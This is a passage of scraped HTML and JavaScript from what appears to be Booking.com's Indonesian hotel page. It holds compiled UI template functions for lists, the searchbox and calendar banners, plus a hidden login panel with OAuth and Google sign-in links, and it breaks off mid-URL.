booking.jstmpl('lists_hotel_dropdown_removed', (function () { var T = ["\n","\n\u003cdiv class=\"preloader-state-icon\"\u003e\n","iconset/loading","\n\u003c/div\u003e\n","\n\u003cdiv class=\"wl-dropdown-removed-title bui_font_body\"\u003e\n","/private/wl_removed_from/name","\n\u003ca\nclass=\"bui-link bui-link--primary bui_font_body wl-dropdown-removed-list__link js-open-list\"\ntarget=\"_blank\"\nhref=\"","\"\n\u003e\n","\n\u003cspan aria-label=\"","\"\u003e\u003c/span\u003e\n\u003c/a\u003e\n","\n\u003cspan class=\"wl-dropdown-removed-title bui_font_body\"\u003e\n","\n\u003c/span\u003e\n\u003cul class=\"bui-list bui-list--unordered wl-dropdown-removed-list\"\u003e\n","\n\u003cli class=\"bui-list__item wl-dropdown-removed-list-item\"\u003e\n","\n\u003c/li\u003e\n","\n\u003c/ul\u003e\n"], V = ["loading_list","lists","url","list_name","name"], WV, LV, VA; return function (VS) { var s = '', r = this.fn; function link_block1(s) { s += [ T[6], r.F['html'](r.MB(V[2])), T[7], r.F['js'](r.F['html'](r.MC(V[3]))), T[8], r.F['js'](r.F['html'](r.MB(V[3]))), T[9] ].join( '' ); return s; } s += T[0]; s += T[0]; if (r.MJ(r.MB(V[0]))) { s += [ T[1],             ( VS.unshift({'name': T[2]}), (VA = r.HELPER("icon", VS[0])), VS.shift(), VA ) , T[3] ].join( '' ); } s += T[0]; if (! (r.MD(V[0]))) { s += T[0]; if ((r.MJ( r.array_length(r.MB(V[1]))  ==  1 ))) { s += [ T[4], r.ME(T[5], r.MB, r.MN, null), T[0] ].join( '' ); { var LA= ( r.MC(V[1]) || [] ); VS.unshift(null); for(var LC=1, LM= LA.length; LC <= LM; LC++) { VS[0]= LA[LC - 1]; s += T[0]; { VS.unshift({'list_name': r.MB(V[4]), 'url': r.MB(V[2])}); s = link_block1(s); VS.shift(); } s += T[0]; } VS.shift(); } s += T[3]; } else  { s += [ T[10], r.ME(T[5], r.MB, r.MN, null), T[11] ].join( '' ); { var LA= ( r.MC(V[1]) || [] ); VS.unshift(null); for(var LC=1, LM= LA.length; LC <= LM; LC++) { VS[0]= LA[LC - 1]; s += T[12]; { VS.unshift({'list_name': r.MB(V[4]), 'url': r.MB(V[2])}); s = link_block1(s); VS.shift(); } s += T[13]; } VS.shift(); } s += T[14]; } s += T[0]; } s += T[0]; return s; }; } )());
</script>
<script nonce="cH3DZKVyvb8x5Uh">booking.jstmpl('searchbox_number_of_nights', (function () { var T = ["","\n","/private/sbox_dates_num_nights_1/name"], V = ["b_interval","b_lang"], WV, LV, VA; return function (VS) { var s = '', r = this.fn; function searchbox_partial_length_of_stay_string_inc1(s) { s += [ T[1], '', T[1],         ( VS.unshift({'num_nights': r.MC(V[0])}), (VA = r.ME(T[2], r.MB, r.MN, r.MO(r.MC(V[0]), null, T[2]))), VS.shift(), VA ) , T[1], '' ].join( '' ); return s; } s += T[0]; { VS.unshift({'b_interval': r.MC(V[0]), 'b_lang': r.MC(V[1])}); s = searchbox_partial_length_of_stay_string_inc1(s); VS.shift(); } return s; }; } )());
</script>
<script nonce="cH3DZKVyvb8x5Uh">booking.jstmpl('searchbox_children_ages_tooltip', (function () { var T = ["","\u003ch3\u003e","/private/sbox_age_of_child_popup_header/name","\u003c/h3\u003e\n\u003cp class=\"searchbox_children_ages_tooltip__text\"\u003e","/private/sbox_age_of_child_popup_best_price/name","\u003c/p\u003e"], V = [], WV, LV, VA; return function (VS) { var s = '', r = this.fn; function bookings2components_search_group_children_ages_tooltip_inc1(s) { s += [ T[1], r.ME(T[2], r.MB, r.MN, null), T[3], r.ME(T[4], r.MB, r.MN, null), T[5] ].join( '' ); return s; } s += T[0]; s = bookings2components_search_group_children_ages_tooltip_inc1(s); return s; }; } )());
</script>
<script nonce="cH3DZKVyvb8x5Uh">booking.jstmpl('searchbox_children_ages_default_12_tooltip', (function () { var T = ["","/private/groups_sr_undefined_ages_msg/name","\u003cspan class=\"fly-dropdown-close fly-dropdown-close-icon\"\u003e\u003c/span\u003e\n\u003cp class=\"searchbox_children_age_default_12_dropdown__text\"\u003e","\u003c/p\u003e\n"], V = ["fe_children_age_warning_text"], WV, LV, VA; return function (VS) { var s = '', r = this.fn; function searchbox_sb_gs_empty_children_age_default_12_inc1(s) { s += T[0]; r.MN(V[0],r.ME(T[1], r.MB, r.MN, null)); s += [ T[2], r.F['entities'](r.MC(V[0])), T[3] ].join( '' ); return s; } s += T[0]; s = searchbox_sb_gs_empty_children_age_default_12_inc1(s); return s; }; } )());
</script>
<script nonce="cH3DZKVyvb8x5Uh">booking.jstmpl('length_of_stay_detailed', (function () { var T = ["","\n\u003cspan class=\"c2-calendar-footer__inner-wrap\"\u003e\n","sbox_calendar_num_nights_2","\u003c/strong\u003e","\u003cstrong\u003e","\n\u003c/span\u003e\n"], V = ["b_interval","b_checkin_date_formatted","b_checkout_date_formatted"], WV, LV, VA; return function (VS) { var s = '', r = this.fn; function searchbox_partial_length_of_stay_detailed_string_inc1(s) { s += [ T[1],         ( VS.unshift({'checkin_date': r.MC(V[1]), 'checkout_date': r.MC(V[2]), 'end_bold': T[3], 'num_nights': r.MC(V[0]), 'start_bold': T[4]}), (VA = r.VP(T[2], r.MO(r.MC(V[0]), null, T[2]))), VS.shift(), VA ) , T[5] ].join( '' ); return s; } s += T[0]; s = searchbox_partial_length_of_stay_detailed_string_inc1(s); return s; }; } )());
</script>
<script nonce="cH3DZKVyvb8x5Uh">booking.jstmpl('calendar_footer_error_above_30_days', (function () { var T = ["\n","/private/sbox_error_30_night_res/name","data-","=\"","\""," data-","\u003cdiv data-component=\"onview-animate\" data-anim-type=\"fadeInBottom\"\u003e ","\u003cdiv class=\"fe_banner fe_banner__accessible ","fe_banner__scale_small ","fe_banner__w-icon ","fe_banner__w-dismiss ","fe_banner__"," ","fe_banner__w-icon-","fe_banner__bp fe_banner__inherit_font_size "," \" ","id=\"","\" ","role=\"alert\"","\u003e ","\u003ci class=\"fe_banner__icon ","\" aria-hidden=\"true\"\u003e\u003c/i\u003e ","\u003cimg class=\"fe_banner__icon\" src=\"","\"\u003e ","\u003cspan class=\"","fe_banner__icon"," \u003c/span\u003e ","\u003cdiv class=\"fe_banner__btn_container\"\u003e \u003cdiv class=\"fe_banner__btn_container_content\"\u003e ","\u003ch3 class=\"fe_banner__title\"\u003e "," \u003c/h3\u003e ","\u003cdiv class=\"fe_banner__message\"\u003e "," \u003c/div\u003e ","\u003c/div\u003e \u003cdiv class=\"fe_banner__button\"\u003e ","\u003c/div\u003e ","\u003cspan class=\"fe_banner__dismiss js-close\" role=\"button\" tabindex=\"1\" aria-label=\"","/private/a11y_cta_close_banner_new/name","\"\u003e\u003ci class=\"bicon-btnclose\"\u003e\u003c/i\u003e\u003c/span\u003e ","0","red"], V = ["fe_error_message","fe_banner__data","fe_banner__data_id","fe_banner__data_value","fe_banner__data_id_2","fe_banner__data_value_2","fe_banner__data_id_3","fe_banner__data_value_3","fe_banner__data_id_4","fe_banner__data_value_4","fe_banner__data_id_5","fe_banner__data_value_5","fe_banner__animate","fe_banner__scale","fe_banner__icon_class","fe_banner__icon_img_url","fe_banner__icon_svg","fe_banner__close_button","fe_banner__color_scheme","fe_banner__color_scheme_classes","fe_banner__icon_size","b_action","fe_banner__extra_classes","fe_banner__id","fe_banner__aria_alert","fe_banner__icon_svg_class","fe_banner__btn_include","fe_banner__title_text","fe_banner__message_text","fe_banner__banners_count"], WV, LV, VA; return function (VS) { var s = '', r = this.fn; function bookings2tmpl_inc_modules_banner_inc1(s) { s += [ '', T[0] ].join( '' ); if (r.MD(V[28])) { s += T[0]; if (r.MD(V[2])) { s += T[0]; r.MN(V[1],[ T[2], r.MB(V[2]), T[3], r.MB(V[3]), T[4] ].join( '' )); s += T[0]; } s += T[0]; if (r.MD(V[4])) { s += T[0]; r.MN(V[1],[ r.MB(V[1]), T[5], r.MB(V[4]), T[3], r.MB(V[5]), T[4] ].join( '' )); s += T[0]; } s += T[0]; if (r.MD(V[6])) { s += T[0]; r.MN(V[1],[ r.MB(V[1]), T[5], r.MB(V[6]), T[3], r.MB(V[7]), T[4] ].join( '' )); s += T[0]; } s += T[0]; if (r.MD(V[8])) { s += T[0]; r.MN(V[1],[ r.MB(V[1]), T[5], r.MB(V[8]), T[3], r.MB(V[9]), T[4] ].join( '' )); s += T[0]; } s += T[0]; if (r.MD(V[10])) { s += T[0]; r.MN(V[1],[ r.MB(V[1]), T[5], r.MB(V[10]), T[3], r.MB(V[11]), T[4] ].join( '' )); s += T[0]; } s += T[0]; if (r.MD(V[12])) { s += T[6]; } s += T[7]; { var CV = r.MB(V[13]); if ((r.MJ( CV  + "" === "" +  "small" ))) { s += T[8]; } else { } } if (( ( r.MJ(r.MB(V[14])) || r.MJ(r.MB(V[15])) ) || r.MJ(r.MB(V[16])) )) { s += T[9]; } if (r.MD(V[17])) { s += T[10]; } if (r.MJ(r.MB(V[18]))) { s += [ T[11], r.F['entities'](r.MC(V[18])), r.F['entities'](r.MC(V[19])), T[12] ].join( '' ); } if (( r.MJ(r.MB(V[14])) && r.MJ(r.MB(V[20])) )) { s += [ T[13], r.F['entities'](r.MC(V[20])), T[12] ].join( '' ); } if (( (r.MJ( r.MC(V[21])  + "" === "" +  "book" )) || (r.MJ( r.MC(V[21])  + "" === "" +  "tpi_book" )) )) { s += T[14]; } s += [ r.F['entities'](r.MC(V[22])), T[15] ].join( '' ); if (r.MD(V[23])) { s += [ T[16], r.F['entities'](r.MC(V[23])), T[17] ].join( '' ); } if (r.MD(V[1])) { s += [ r.MC(V[1]), T[12] ].join( '' ); } if (r.MD(V[24])) { s += T[18]; } s += T[19]; if (r.MD(V[14])) { s += [ T[20], r.F['entities'](r.MC(V[14])), T[21] ].join( '' ); } else if (r.MD(V[15])) { s += [ T[22], r.F['entities'](r.MC(V[15])), T[23] ].join( '' ); } else if (r.MD(V[16])) { s += T[24]; if (r.MD(V[25])) { s += r.F['entities'](r.MC(V[25])); } else  { s += T[25]; } s += [ T[23], r.MC(V[16]), T[26] ].join( '' ); } if (r.MD(V[26])) { s += T[27]; } if (r.MD(V[27])) { s += [ T[28], r.MC(V[27]), T[29] ].join( '' ); } if (r.MD(V[28])) { s += [ T[30], r.MC(V[28]), T[31] ].join( '' ); } if (r.MD(V[26])) { s += [ T[32], r.MC(V[26]), T[31] ].join( '' ); } if (r.MD(V[26])) { s += T[33]; } if (r.MD(V[17])) { s += [ T[34], r.ME(T[35], r.MB, r.MN, null), T[36] ].join( '' ); } s += T[33]; if (r.MD(V[12])) { s += T[33]; } s += T[0]; } s += T[0]; r.MN(V[18], undefined); s += T[0]; r.MN(V[14], undefined); s += T[0]; r.MN(V[15], undefined); s += T[0]; r.MN(V[16], undefined); s += T[0]; r.MN(V[20], undefined); s += T[0]; r.MN(V[27], undefined); s += T[0]; r.MN(V[28], undefined); s += T[0]; r.MN(V[26], undefined); s += T[0]; r.MN(V[17], undefined); s += T[0]; r.MN(V[23], undefined); s += T[0]; r.MN(V[22], undefined); s += T[0]; r.MN(V[13], undefined); s += T[0]; r.MN(V[2], undefined); s += T[0]; r.MN(V[3], undefined); s += T[0]; r.MN(V[4], undefined); s += T[0]; r.MN(V[5], undefined); s += T[0]; r.MN(V[6], undefined); s += T[0]; r.MN(V[7], undefined); s += T[0]; r.MN(V[8], undefined); s += T[0]; r.MN(V[9], undefined); s += T[0]; r.MN(V[10], undefined); s += T[0]; r.MN(V[11], undefined); s += T[0]; r.MN(V[19], undefined); s += T[0]; r.MN(V[1], undefined); s += T[0]; r.MN("fe_banner__banners_count", (r.MI( r.MB(V[29]) ) + r.MI( 1 ))); s += T[0]; if (( (r.MJ( r.MC(V[21])  + "" === "" +  "book" )) && r.MJ(r.track_experiment_stage("HBaMEAbXDMUBdOYZbKZTSfXPRQYO", 2)) )) { s += T[0]; } else if (r.MJ(r.track_experiment_stage("HBaMEAbXDMUBdOYZbKZTSfXPRQYO", 1))) { s += T[0]; } s += [ T[0], '', T[0] ].join( '' ); return s; } s += T[0]; r.MN(V[0],[ T[0], r.ME(T[1], r.MB, r.MN, null), T[0] ].join( '' )); s += T[0]; { VS.unshift({'fe_banner__close_button': T[37], 'fe_banner__color_scheme': T[38], 'fe_banner__message_text': r.MB(V[0])}); s = bookings2tmpl_inc_modules_banner_inc1(s); VS.shift(); } s += T[0]; return s; }; } )());
</script>
<script type='text/javascript' nonce="cH3DZKVyvb8x5Uh">
booking.jstmpl('lists_recently_viewed', (function () { var T = ["\n","'","\n\u003cdiv class=\"save-recently-viewed-container\"\u003e\n\u003cdiv class=\"save-recently-viewed-button-container\"\u003e\n\u003cp\u003e","\u003c/p\u003e\n\u003cbutton class=\"b-button b-button_primary save-recently-viewed js-save-recently-viewed ","disabled","\"\ntype=\"submit\"\ntitle=\"","\"\u003e\n\u003cspan class=\"b-button__text\"\u003e","\u003c/span\u003e\n\u003c/button\u003e\n\u003cimg class=\"js-add-recently-viewed-to-list-loader loader g-hidden\" src=\"","\" /\u003e\n\u003c/div\u003e\n\u003cdiv class=\"save-recently-viewed-container-clear\"\u003e\u003c/div\u003e\n\u003cdiv class=\"wl-oz wl-anim wl-wrap\" id=\"wl-saved-recently-viewed-message\" ","style=\"height:auto;\""," \u003e\n\u003cp class=\"wl-msg wl-msg-ok\"\u003e\n\u003cspan class=\"js-added-recently-viewed-message\"\u003e","\u003c/span\u003e.\n\u003ca href=\"","\" class=\"js-open-list\"\u003e","\u003c/a\u003e.\n\u003c/p\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n"], V = ["name_of_list","recently_viewed_list_name","recently_viewed_list_button_text","recently_viewed_list_v3","recently_viewed_list_saved_text","recently_viewed_list_variableopt_2","properties_length","recently_viewed_list_v4","recently_viewed_list_variableopt_1","recently_viewed_list_v2","success","wl_recently_viewed_loader","recently_viewed_list_url","recently_viewed_list_v7"], WV, LV, VA; return function (VS) { var s = '', r = this.fn; function bookings2components_lists_lists_recently_viewed_lists_recently_viewed_inc1(s) { r.MN(V[0],[ T[1], r.MB(V[1]), T[1] ].join( '' )); s += T[0]; if ((r.MJ( r.MB(V[6])  >  1 ))) { s += T[0]; r.MN(V[2],r.MB(V[3])); s += T[0]; r.MN(V[4],r.MB(V[5])); s += T[0]; } else  { s += T[0]; r.MN(V[2],r.MB(V[7])); s += T[0]; r.MN(V[4],r.MB(V[8])); s += T[0]; } s += [ T[2], r.MB(V[9]), T[3] ].join( '' ); if (r.MD(V[10])) { s += T[4]; } s += [ T[5], r.MB(V[2]), T[6], r.MB(V[2]), T[7], r.MB(V[11]), T[8] ].join( '' ); if (r.MD(V[10])) { s += T[9]; } s += [ T[10], r.MB(V[4]), T[11], r.MB(V[12]), T[12], r.MB(V[13]), T[13] ].join( '' ); return s; } s += T[0]; s = bookings2components_lists_lists_recently_viewed_lists_recently_viewed_inc1(s); s += T[0]; return s; }; } )());
</script>
<script nonce="cH3DZKVyvb8x5Uh">
(function(B){
var tmp = B._onfly || [], fn;
for (var i = 0, l = tmp.length; i < l; i++) {
if (typeof tmp[i] === 'function') tmp[i].call(B);
}
B._onfly = null;
}(booking));
</script>

<div class="g-hidden">
<div class="js-user-access-menu-lightbox user-access-menu-lightbox--signin user-access-menu-lightbox--no-password-strength">
<svg class="bk-icon -logos-booking-logo" height="42" style="display:none;" width="252" viewBox="0 0 252 42" role="presentation" aria-hidden="true" focusable="false">
<path d="M15.592 22.92C15.591 20.283 13.924 18.652 11.348 18.652H7.738C6.58 18.815 6.055 19.518 6.055 20.877V26.783L11.348 26.79C13.966 26.79 15.591 25.629 15.592 22.92ZM6.055 13.391H10.819C13.496 13.391 14.449 11.689 14.449 9.911C14.449 7.576 13.057 6.181 10.735 6.181H8.025C6.671 6.268 6.055 6.966 6.055 8.428V13.391ZM21.815 23.351C21.815 28.956 17.536 32.87 10.912 32.87H0V4.87C0.02 3.085 1.872 1.285 3.64 1.218H10.777C16.737 1.218 20.587 4.222 20.587 9.202C20.587 12.462 18.959 14.346 17.988 15.183L17.152 15.9L18.109 16.441C20.432 17.751 21.815 20.333 21.815 23.351V23.351ZM148.135 20.675C148.135 15.58 145.385 14.986 143.325 14.986C139.165 14.986 138.845 19.175 138.845 20.459C138.845 23.376 140.105 26.49 143.665 26.49C145.705 26.49 148.135 25.48 148.135 20.675V20.675ZM154.045 9.738L154.025 30.732C154.025 38.739 148.045 41.584 142.505 41.584C139.815 41.584 136.845 40.858 134.555 39.639L134.105 39.4L134.835 37.53L135.345 36.243C135.905 34.855 136.715 34.509 138.095 34.928C139.155 35.312 140.735 35.739 142.475 35.739C146.045 35.739 148.015 34.05 148.015 30.994V30.356L147.505 30.732C146.215 31.72 144.575 32.205 142.505 32.205C136.445 32.205 132.215 27.445 132.215 20.63C132.215 13.811 136.305 9.228 142.385 9.228C145.445 9.228 147.325 10.309 148.375 11.221L148.675 11.482L148.855 11.132C149.325 10.23 150.275 9.738 151.515 9.738H154.045V9.738ZM67.707 21.184C67.707 17.473 65.411 14.877 62.137 14.877C58.877 14.877 56.608 17.473 56.608 21.184C56.608 24.898 58.878 27.496 62.138 27.496C65.464 27.496 67.708 24.958 67.708 21.184H67.707ZM74.088 21.184C74.088 28.054 69.052 33.04 62.138 33.04C55.234 33.04 50.228 28.054 50.228 21.184C50.228 14.318 55.234 9.331 62.138 9.331C69.052 9.331 74.088 14.318 74.088 21.184ZM105.445 32.677V13.281C105.445 10.941 104.335 9.806 102.025 9.806L99.465 9.796L99.485 27.5H99.465L99.485 32.87H105.445V32.677ZM122.505 9.278C119.175 9.278 117.055 10.765 115.865 12.018L115.465 12.423L115.325 11.873C114.975 10.529 113.795 9.788 112.025 9.788H109.165L109.185 32.683H115.225V22.131C115.225 21.099 115.365 20.205 115.635 19.387C116.355 16.914 117.995 15.378 120.525 15.378C122.555 15.378 123.725 16.453 123.725 19.232V29.203C123.725 31.573 125.195 32.683 127.555 32.683H129.785V18.261C129.785 12.475 127.825 9.278 122.505 9.278V9.278ZM91.436 21.777C91.1964 21.3119 90.8928 20.8827 90.534 20.502L90.326 20.281L90.546 20.069C90.862 19.734 91.186 19.338 91.497 18.878L97.584 9.795H90.195L85.622 16.899C85.363 17.28 84.84 17.472 84.058 17.472H82.48V4.045C82.48 1.36 80.642 0 78.84 0H76.414L76.42 32.691H82.48V23.183H83.63C84.375 23.183 84.883 23.269 85.118 23.675L88.729 30.518C89.736 32.375 90.743 32.691 92.635 32.691H97.651L93.915 26.488L91.436 21.777ZM41.648 21.184C41.648 17.473 39.358 14.877 36.079 14.877C32.819 14.877 30.553 17.473 30.553 21.184C30.553 24.898 32.819 27.496 36.079 27.496C39.405 27.496 41.649 24.958 41.649 21.184H41.648ZM48.028 21.184C48.028 28.054 43.002 33.04 36.079 33.04C29.182 33.04 24.177 28.054 24.177 21.184C24.177 14.318 29.182 9.331 36.079 9.331C43.002 9.331 48.027 14.318 48.027 21.184H48.028ZM98.764 3.81C98.764 1.704 100.464 0 102.544 0C104.634 0 106.334 1.704 106.334 3.81C106.334 5.911 104.634 7.617 102.544 7.617C100.464 7.617 98.764 5.911 98.764 3.81Z" fill="#003580"/>
<path d="M187.08 25.067C187.06 25.088 184.38 27.915 180.87 27.915C177.66 27.915 174.42 25.941 174.42 21.538C174.42 17.73 176.93 15.071 180.53 15.071C181.7 15.071 183.02 15.492 183.23 16.198L183.26 16.318C183.74 17.919 185.19 18.001 185.47 18.001L188.88 18.005V15.021C188.88 11.085 183.89 9.65698 180.53 9.65698C173.35 9.65698 168.14 14.674 168.14 21.584C168.14 28.489 173.29 33.502 180.4 33.502C186.56 33.502 189.91 29.434 189.94 29.391L190.12 29.172L187.43 24.685L187.08 25.067ZM244.43 9.65698C241.73 9.65698 239.25 10.927 237.58 13.05L237.11 13.651L236.74 12.979C235.53 10.776 233.46 9.65698 230.57 9.65698C227.55 9.65698 225.53 11.35 224.58 12.358L223.97 13.024L223.73 12.144C223.39 10.877 222.26 10.178 220.56 10.178H218.06L218.04 32.984H224.01V22.917C224.01 22.036 224.12 21.163 224.34 20.248C224.93 17.816 226.56 15.202 229.3 15.462C230.99 15.626 231.81 16.936 231.81 19.466V32.984H237.44V22.917C237.44 21.813 237.55 20.99 237.79 20.162C238.3 17.842 240.37 15.459 243.02 15.459C244.93 15.459 245.93 16.545 245.93 19.466V29.649C245.93 31.954 247.28 32.984 249.57 32.984H251.99L252 18.424C252 12.607 249.45 9.65698 244.43 9.65698V9.65698ZM203.66 10.043C196.76 10.043 191.35 15.031 191.35 21.898C191.35 28.765 196.76 33.754 203.66 33.754C210.58 33.754 215.61 28.765 215.61 21.898C215.61 15.031 210.58 10.043 203.66 10.043V10.043ZM158.31 29.446C158.31 27.34 160 25.636 162.09 25.636C164.18 25.636 165.88 27.34 165.88 29.446C165.88 31.548 164.18 33.254 162.09 33.254C160 33.254 158.31 31.548 158.31 29.446ZM203.66 28.209C200.4 28.209 198.13 25.611 198.13 21.898C198.13 18.186 200.4 15.59 203.66 15.59C206.93 15.59 209.23 18.186 209.23 21.898C209.23 25.671 206.99 28.209 203.66 28.209Z" fill="#003580"/>
</svg>
<div class="iam_account_access">
<div class="iam_card iam_login_form">
<div class="iam_login_text iam_login_text--header">
Login untuk melanjutkan
</div>
<a
href="https:&#47;&#47;account.booking.com&#47;auth&#47;oauth2?state=UrMEqvSP9Uxl72rD-cf0kqa9YEdqdkxzWReZxhRWwMPQqmPuGbrMWEuPHGdt_UwDM0h8d20VAVvKw_t6rFy-wDZe5jOlHoAa0-HrS8CE34_3ka4yFauwJhLVH8UqslNXwtdmtAEy8mlj80MRPcxa_vfqL0DwIdAqem1ERLGyvljXlExJ1jTxu0MKVD47WYkvYpwS5arjSgVfwqt3g-qzC8j0mnNFcAZyaDA21jUSbFZmXoIHpDcRA0SIZzZQ8wJ7AU1qTOUVHd2ToVvP81LFPPs7Hc5g7OG3Vb8rSn7tChtum-XKczLMLJikj20FfEKZgK4C-59JfwkVQ_vf7NyRLWmmV0o1Ygqj5bZNrdjD1YSGl5lDRS2VKdnMsK_B06KR29-cnHNEcYJTMsnm1Uaztdo5ZJ3_7n1EN9lYrMaA6R6hA4326IOW3i-qP2Ag6jk4oUpDTMJkfvTQv0lCdJZB7nbufPCAjOXn-m7VCXaXUe9DfE8F5dtC10XystJlf6MYKzibb24flHJ_hl-MNFPsb5UZre_xP9TRx5HP8Tfi6zZAZK-VGV7KTmUMhmMI24IZHSmyUCIm0mTeEddYzeUvXMX0wB666X9jmYPtD3SuskfQ6it12fkge0OrcbMCRnBc1Y3lZOIdNvIf90Ch1cuft1TRy7WMFua2NcUXan0tHvZxQ_1bc5JnS5Vbn8NzEi813xOAsYqjJORazicCiIYBX-Km4RQVONLzN5HTUp4dwa1yl_84v8c&amp;redirect_uri=https%3A%2F%2Fsecure.booking.com%2Flogin.html%3Fop%3Doauth_return&amp;client_id=vO1Kblk7xX9tUn2cpZLS&amp;dt=1758946077&amp;bkng_action=hotel&amp;response_type=sso&amp;aid=356980&amp;lang=id"
class="iam_login_btn--email bui-button bui-button--large bui-button--wide bui-spacer"
role="button"
data-bui-component="Button"
>
<span class="bui-button__text">
Login ke akun Anda
</span>
</a>
<div class="iam_login_or">
<div class="iam_login_or_divider"></div>
<span class="iam_login_or_text">or use one of these options</span>
</div>
<div class="access-panel__social-buttons">
<a
href="https:&#47;&#47;account.booking.com&#47;auth&#47;oauth2?state=UrMEqvSP9Uxl72rD-cf0kqa9YEdqdkxzWReZxhRWwMPQqmPuGbrMWEuPHGdt_UwDM0h8d20VAVvKw_t6rFy-wDZe5jOlHoAa0-HrS8CE34_3ka4yFauwJhLVH8UqslNXwtdmtAEy8mlj80MRPcxa_vfqL0DwIdAqem1ERLGyvljXlExJ1jTxu0MKVD47WYkvYpwS5arjSgVfwqt3g-qzC8j0mnNFcAZyaDA21jUSbFZmXoIHpDcRA0SIZzZQ8wJ7AU1qTOUVHd2ToVvP81LFPPs7Hc5g7OG3Vb8rSn7tChtum-XKczLMLJikj20FfEKZgK4C-59JfwkVQ_vf7NyRLWmmV0o1Ygqj5bZNrdjD1YSGl5lDRS2VKdnMsK_B06KR29-cnHNEcYJTMsnm1Uaztdo5ZJ3_7n1EN9lYrMaA6R6hA4326IOW3i-qP2Ag6jk4oUpDTMJkfvTQv0lCdJZB7nbufPCAjOXn-m7VCXaXUe9DfE8F5dtC10XystJlf6MYKzibb24flHJ_hl-MNFPsb5UZre_xP9TRx5HP8Tfi6zZAZK-VGV7KTmUMhmMI24IZHSmyUCIm0mTeEddYzeUvXMX0wB666X9jmYPtD3SuskfQ6it12fkge0OrcbMCRnBc1Y3lZOIdNvIf90Ch1cuft1TRy7WMFua2NcUXan0tHvZxQ_1bc5JnS5Vbn8NzEi813xOAsYqjJORazicCiIYBX-Km4RQVONLzN5HTUp4dwa1yl_84v8c&amp;redirect_uri=https%3A%2F%2Fsecure.booking.com%2Flogin.html%3Fop%3Doauth_return&amp;client_id=vO1Kblk7xX9tUn2cpZLS&amp;dt=1758946077&amp;bkng_action=hotel&amp;response_type=sso&amp;aid=356980&amp;lang=id&amp;prompt=google"
data-popup-href="https:&#47;&#47;account.booking.com&#47;auth&#47;oauth2?bkng_action=hotel&amp;dt=1758946077&amp;lang=id&amp;response_type=sso&amp;aid=356980&amp;redirect_uri=https%3A%2F%2Fsecure.booking.com%2Flogin.html%3Fop%3Doauth_return&amp;state=Uu0DqvSP9Uxl72rkGSVZLlJiNeYXTAYwCDIQcfE30DdSRS2cmccu2J0ajue6ev-W26WNSqHU45uYapDo8TNSlLF4vNmefMoqZG7_MGrZzOhQMPEr5JMhNBwmL2ToS81DCsr-sUDJqmnFNYYXbwbf3LNx5KqJOjptBbZoiOUyFl5ZgEA4cCb256B3RvbWpOaE_UmGpOvkAB1_6RckKlhEGtg3OxGV9DYYS9CjvVo0S6sZoz7eTiYVuhizuMtPwIjs6aVS2_Au6GV63RyWVuAo73cOUDVIgfOknjijBoXn9oObdQMkqNH85RcMbCWH4lux-2L5xvBzS07Y3g99pqL-lLiUiWEXteNBbpa9ZbskwfjAprHhn7mPK9GO3Gk5V2hp2ZzWLH5RVxCcM3NIp8N8rBarbF7GIIpdk9SC8tIlErf3GQ6kfq0ojMRDLlVFUxI8hQHGKYpHg93Of_AZQcwqbWqJ29k9zG-Y35EfDIaX32y0A4kmcgvfCjtYww-PExodsZh8i64sBY-4bhjFDl_mUb8AYcNJ-FDf2l82SmKn2_5sMnDP4T2bevshEK4fvgHuxpTfOKqEe3kGsQuscyQ-iEM9GKoRfpszzkL5Kk4y7uwD3VOXHeEYZqGRmQlfVuW3Bs4uocrEo0dMAZO-qBNzfw&amp;popup=1&amp;client_id=vO1Kblk7xX9tUn2cpZLS&amp;prompt=google"
class="iam_login_form__social-button iam_login_form__social-button-google bui-button bui-button--secondary "
title="Login dengan Google"
aria-label="Login dengan Google"
data-component="iam/social-button"
data-mask="true"
>
<div class="iam_login_form__social-button-content">
<div class="iam_login_form__social-button-image">
<svg class="bk-icon -social-providers-google" height="24" width="24" viewBox="0 0 262 262" role="presentation" aria-hidden="true" focusable="false"><path d="M255.878 133.451c0-10.734-.871-18.567-2.756-26.69H130.55v48.448h71.947c-1.45 12.04-9.283 30.172-26.69 42.356l-.244 1.622 38.755 30.023 2.685.268c24.659-22.774 38.875-56.282 38.875-96.027" fill="#4285F4"/><path d="M130.55 261.1c35.248 0 64.839-11.605 86.453-31.622l-41.196-31.913c-11.024 7.688-25.82 13.055-45.257 13.055-34.523 0-63.824-22.773-74.269-54.25l-1.531.13-40.298 31.187-.527 1.465C35.393 231.798 79.49 261.1 130.55 261.1" fill="#34A853"/><path d="M56.281 156.37c-2.756-8.123-4.351-16.827-4.351-25.82 0-8.994 1.595-17.697 4.206-25.82l-.073-1.73L15.26 71.312l-1.335.635C5.077 89.644 0 109.517 0 130.55s5.077 40.905 13.925 58.602l42.356-32.782" fill="#FBBC05"/><path d="M130.55 50.479c24.514 0 41.05 10.589 50.479 19.438l36.844-35.974C195.245 12.91 165.798 0 130.55 0 79.49 0 35.393 29.301 13.925 71.947l42.211 32.783c10.59-31.477 39.891-54.251 74.414-54.251" fill="#EB4335"/></svg>
</div>
</div>
</a>
<a
href="https:&#47;&#47;account.booking.com&#47;auth&#47;oauth2?state=UrMEqvSP9Uxl72rD-cf0kqa9YEdqdkxzWReZxhRWwMPQqmPuGbrMWEuPHGdt_UwDM0h8d20VAVvKw_t6rFy-wDZe5jOlHoAa0-HrS8CE34_3ka4yFauwJhLVH8UqslNXwtdmtAEy8mlj80MRPcxa_vfqL0DwIdAqem1ERLGyvljXlExJ1jTxu0MKVD47WYkvYpwS5arjSgVfwqt3g-qzC8j0mnNFcAZyaDA21jUSbFZmXoIHpDcRA0SIZzZQ8wJ7AU1qTOUVHd2ToVvP81LFPPs7Hc5g7OG3Vb8rSn7tChtum-XKczLMLJikj20FfEKZgK4C-59JfwkVQ_vf7NyRLWmmV0o1Ygqj5bZNrdjD1YSGl5lDRS2VKdnMsK_B06KR29-cnHNEcYJTMsnm1Uaztdo5ZJ3_7n1EN9lYrMaA6R6hA4326IOW3i-qP2Ag6jk4oUpDTMJkfvTQv0lCdJZB7nbufPCAjOXn-m7VCXaXUe9DfE8F5dtC10XystJlf6MYKzibb24flHJ_hl-MNFPsb5UZre_xP9TRx5HP8Tfi6zZAZK-VGV7KTmUMhmMI24IZHSmyUCIm0mTeEddYzeUvXMX0wB666X9jmYPtD3SuskfQ6it12fkge0OrcbMCRnBc1Y3lZOIdNvIf90Ch1cuft1TRy7WMFua2NcUXan0tHvZxQ_1bc5JnS5Vbn8NzEi813xOAsYqjJORazicCiIYBX-Km4RQVONLzN5HTUp4dwa1yl_84v8c&amp;redirect_uri=https%3A%2F